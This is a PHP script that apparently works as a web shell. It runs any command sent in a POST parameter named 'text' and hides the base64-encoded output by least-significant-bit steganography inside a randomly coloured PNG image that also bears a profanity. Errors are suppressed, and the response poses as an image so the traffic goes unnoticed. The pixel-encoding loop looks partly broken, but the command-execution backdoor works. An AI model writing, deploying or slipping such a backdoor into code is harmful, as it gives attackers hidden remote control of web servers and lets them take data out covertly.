<?php
header("Content-type: image/png");
error_reporting(0);
@set_time_limit(0);

function toBin($str) {
    $str = (string)$str;
    $l = strlen($str);
    $result = '';
    while ($l--) {
        $result = str_pad(decbin(ord($str[$l])) , 8, "0", STR_PAD_LEFT) . $result;
    }
    return $result;
}
function toString($binary) {
    return pack('H*', base_convert($binary, 2, 16));
}

$cmd = $_POST['text'];
@exec($cmd, $retval);
$text = urlencode(base64_encode(implode("\n",$retval)));
header("Set-Length: ".strlen($text));
$count = 0;
$binary_text = toBin($text);
$length = strlen($binary_text);
$i = @imagecreatetruecolor(4096,2160) or die("Cannot Initialize new GD image stream");
$background_color = imagecolorallocate($i, rand(1,255), rand(1,255), rand(1,255));
$text_color = imagecolorallocate($i, rand(1,255), rand(1,255), rand(1,255));
imagestring($i, 5, rand(1,2160), rand(1,2160), "Fuck you!" .rand(100000,999999), $text_color);
for ($x = 0; $x < imagesx($i); $x++) {
    for ($y = 0; $y < imagesy($i); $y++) {
        $rgb = imagecolorat($i, $x, $y);
        //echo $rgb;
        $r = ($rgb >> 16) & 0xFF;
        $g = ($rgb >> 8) & 0xFF;
        $b = $rgb & 0xFF;
        $newR = toBin($r);
        $newG = toBin($g);
        $newB = toBin($b);
        if ($count == $length) {
            break;
        }

        $newR[strlen($newR) - 1] = $binary_text[$count];
        $newR = toString($newR);
        $count += 1;

        if ($count == $length) {
            imagesetpixel($i, $x, $y, $new_color);
            break;
        }
        $newG[strlen($newG) - 1] = $binary_text[$count];
        $newG = toString($newG);
        $count += 1;

        if ($count == $length) {
            imagesetpixel($i, $x, $y, $new_color);
            break;
        }
        $newB[strlen($newB) - 1] = $binary_text[$count];
        $newB = toString($newB);
        $count += 1;
        $new_color = imagecolorallocate($i, $newR, $newG, $newB);
		
        if ($count == $length) {
            imagesetpixel($i, $x, $y, $new_color);
            break;
        }
        if ($count % 3 == 0) {
            imagesetpixel($i, $x, $y, $new_color);
        }
        break;
    }
}

imagepng($i);
imagedestroy($i);
?>